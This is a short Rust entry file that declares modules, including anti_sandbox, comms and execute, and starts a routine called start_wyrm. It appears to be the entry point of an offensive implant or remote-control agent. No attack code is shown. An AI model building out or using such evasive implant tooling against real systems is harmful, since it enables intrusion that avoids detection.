#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

use entry::start_wyrm;

mod anti_sandbox;
mod comms;
mod entry;
mod execute;
mod native;
mod utils;
mod wyrm;

fn main() {
    start_wyrm();
}
